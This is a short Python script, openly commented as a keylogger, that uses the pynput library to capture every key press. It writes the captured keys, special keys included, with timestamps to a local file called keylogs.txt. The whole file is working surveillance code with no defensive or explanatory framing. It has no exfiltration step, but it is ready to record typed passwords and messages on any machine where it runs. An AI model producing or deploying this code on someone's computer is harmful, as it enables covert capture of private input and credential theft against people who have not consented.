import logging
from pynput import keyboard

# configure the logger
logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# define a callback function to handle key presses
def on_press(key):
    try:
        # write the key to the log file
        logging.info(key.char)
    except AttributeError:
        # some special keys like "Shift" and "Ctrl" don't have a char attribute
        logging.info(str(key))

# start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
